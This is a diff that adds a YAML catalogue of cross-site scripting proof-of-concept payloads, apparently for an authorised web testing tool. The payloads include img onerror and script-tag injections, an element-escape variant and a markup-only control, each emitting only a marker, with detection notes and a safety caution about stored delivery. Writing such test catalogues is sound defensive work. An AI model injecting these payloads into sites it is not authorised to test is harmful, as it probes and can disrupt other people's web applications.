@@ -1,0 +1,33 @@
+# Element content. The marker is computed or unique, never a literal the request
+# also carries; a reflected proof may raise a dialog, a stored one may not.
+id: xss/htmlbody
+title: Element content execution proofs
+reviewed: "2026-08-31"
+variables: [MARKER, TAG]
+safety: >-
+  Proof-of-concept only: each entry produces one observable marker and does
+  nothing else. Where the delivery is stored, use the silent form and record the
+  location -- a dialog placed in a shared page fires for every visitor and is an
+  incident the tester created.
+entries:
+  - name: self-firing element, reflected
+    delivery: [reflected]
+    payload: "<img src=x onerror=alert('{{MARKER}}')>"
+    detect: "A dialog carrying the marker. Fires without interaction, so a negative is a negative rather than an untriggered handler."
+
+  - name: self-firing element, stored
+    delivery: [stored]
+    payload: "<img src=x onerror=console.log('{{MARKER}}')>"
+    detect: "The marker in the console of a page loaded normally. Silent by design: the same proof without a dialog for whoever else opens the page."
+
+  - name: script block
+    payload: "<script>console.log('{{MARKER}}')</script>"
+    detect: "Fails where an inline-script policy is in force while the element form succeeds; sending both separates an encoder from a policy."
+
+  - name: escape the containing element first
+    payload: "</{{TAG}}><img src=x onerror=console.log('{{MARKER}}')>"
+    detect: "For a value inside textarea, title or noscript, where the content model is not markup until the element is closed."
+
+  - name: markup-only control
+    payload: "<b>{{MARKER}}</b>"
+    detect: "Bold text in the rendered page with no script. Distinguishes markup injection from execution, which are two findings with different severity."
